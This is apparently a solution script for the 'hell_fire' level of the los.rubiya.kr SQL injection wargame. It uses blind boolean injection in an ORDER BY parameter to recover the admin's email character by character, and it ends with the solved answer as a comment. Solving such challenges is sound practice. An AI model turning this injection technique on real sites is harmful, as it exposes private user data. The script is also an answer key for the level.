import requests
url = 'https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php'
cookies = {'PHPSESSID': '7tk79o2eguv6s5m0c4mh9ifki2'}
flag = ""
for i in range(1,50):
    try:
        query = url+"?order=if((id='admin' and length(email)="+str(i)+"),score,9999)"
        response = requests.get(query, cookies=cookies)
    except:
        print("[-]Error occur!")
        continue
    html_data = response.text
    print(response.url)
    # print(html_data)
    if ("<td>200</td></tr><tr><td>rubiya</td>" in html_data):
        print ("[+]Find Length : " + str(i))
        length = i
        break
print(length)
 
for i in range(1,length+1):
    for j in range(48,127):
        try:
            query = url + "?order=if((id='admin' and ord(substr(email,"+str(i)+",1))="+str(j)+"),score,9999)"    
            response = requests.get(query, cookies=cookies)
        except:
            print("[-]Error occur!")
            continue
        html_data = response.text
        print(response.url)
        if ("<td>200</td></tr><tr><td>rubiya</td>" in html_data):
            print ("[+]Find Key : " + chr(j))
            flag += chr(j)
            break
print (flag)

# solve : admin_secure_email@emai1.com
